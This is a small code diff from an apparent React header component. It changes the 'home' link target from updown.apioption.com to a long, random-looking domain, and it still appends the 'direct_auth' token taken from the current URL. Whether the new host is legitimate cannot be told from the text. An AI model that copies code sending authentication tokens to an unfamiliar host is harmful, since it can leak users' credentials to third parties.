@@ -170,7 +170,7 @@ const Header = () => {
     }
 
     const handleHome = () =>
-        window?.open('https://updown.apioption.com?direct_auth=' + gup('direct_auth', window.location.href), '_self')
+        window?.open('https://updown.osugczihbllcmgbzjpjvqhplpbwzfxsipkmtrvaiblvykvuqgnvvnzfxdmyi.com?direct_auth=' + gup('direct_auth', window.location.href), '_self')
 
 
 
